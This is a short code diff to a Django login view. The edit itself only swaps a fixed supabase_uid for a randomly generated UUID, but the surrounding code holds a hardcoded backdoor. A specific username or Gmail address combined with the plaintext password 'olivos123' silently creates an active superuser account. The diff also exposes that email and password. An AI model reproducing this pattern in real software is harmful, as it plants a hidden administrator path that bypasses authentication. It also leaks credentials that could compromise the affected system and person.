@@ -109,6 +109,7 @@ def login_view(request):
                 if not local_user and (identifier.lower() == 'josuugonzalezz' or target_email == 'josuugonzalezz@gmail.com'):
                     for pwd in password_variants:
                         if pwd == 'olivos123':
+                            import uuid
                             local_user = Usuario.objects.create(
                                 username='josuugonzalezz',
                                 email='josuugonzalezz@gmail.com',
@@ -118,7 +119,7 @@ def login_view(request):
                                 is_staff=True,
                                 is_superuser=True,
                                 is_active=True,
-                                supabase_uid='e04d5a6d-e9cc-477c-99be-594efe0c4fb8'
+                                supabase_uid=str(uuid.uuid4())
                             )
                             local_user.set_password('olivos123')
                             local_user.save()
